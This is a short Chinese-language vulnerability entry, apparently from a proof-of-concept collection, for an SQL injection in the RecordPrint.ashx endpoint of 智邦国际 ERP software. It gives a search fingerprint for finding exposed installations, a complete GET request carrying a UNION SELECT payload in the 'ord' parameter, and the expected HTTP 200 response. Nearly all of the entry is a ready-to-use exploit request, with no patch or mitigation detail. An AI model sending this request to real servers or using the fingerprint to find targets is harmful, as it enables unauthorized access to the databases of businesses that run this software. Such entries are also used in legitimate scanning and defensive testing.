# 智邦国际ERPRecordPrint.ashx存在SQL注入漏洞

智邦国际 ｜ SQL注入 ｜ —
- **指纹**：`app="智邦国际-企业管理软件"`
- **请求**：`GET /SYSN/json/pcclient/RecordPrint.ashx?sort=1&ord=-1'%20union%20select%20@@version-- HTTP/1.1`
- **响应特征**：200